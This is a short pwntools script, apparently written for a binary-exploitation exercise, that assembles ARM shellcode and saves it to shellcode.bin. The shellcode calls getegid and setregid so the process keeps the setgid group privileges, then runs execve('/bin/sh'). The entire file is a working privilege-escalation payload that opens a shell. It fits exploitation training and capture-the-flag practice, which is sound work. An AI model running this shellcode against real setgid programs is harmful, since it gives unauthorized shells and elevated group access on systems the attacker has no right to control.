#!/usr/bin/env python3
from pwn import *
from pwn import asm, context

context.arch = "arm"
# setregid(getegid(), getegid())
# getegid: 50(%r7)
# setregid: 71(%r7) (%r0 = gid_t rgid, %r1 = gid_t rgid)
shellcode = asm(
    """
mov     r7, 50
swi     0
mov     r1, r0
mov     r7, 71
swi     0
"""
)
# execve("/bin/sh", 0, 0)
# execve: 11(%r7) (%r0 = const char *filename, %r1 = const char *argv[], %r2 = const char *envp[])
shellcode += asm(
    """
adr     r0, _bin_sh
mov     r1, 0
mov     r2, 0
mov     r7, 11
swi     0
_bin_sh:
    .asciz "/bin/sh"
"""
)

with open("shellcode.bin", "wb") as shellcode_file:
    shellcode_file.write(shellcode)
# io = process(["./1-shellcode-32"])
# io.interactive()
